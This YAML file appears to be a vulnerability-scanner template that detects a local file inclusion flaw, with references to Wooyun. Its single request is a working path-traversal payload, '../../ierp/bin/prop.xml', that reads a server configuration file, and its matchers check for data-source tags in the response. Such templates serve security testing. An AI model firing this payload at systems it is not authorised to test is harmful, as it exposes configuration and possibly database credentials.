id: wooyun-path-traversal

info:
  name: Wooyun - Local File Inclusion
  author: pikpikcu
  severity: high
  description: |
    Wooyun is vulnerable to local file inclusion.
  reference:
    - https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html
  classification:
    cpe: cpe:2.3:a:wooyun:wooyun:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-23,CWE-73
  metadata:
    max-request: 1
    vendor: wooyun
    product: wooyun
  tags: lfi,wooyun,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        name: wooyun
        cpe: cpe:2.3:a:wooyun:wooyun:*:*:*:*:*:*:*:*
        words:
          - <DataSourceClassName>
          - </DataSourceClassName>
        part: body
        condition: and
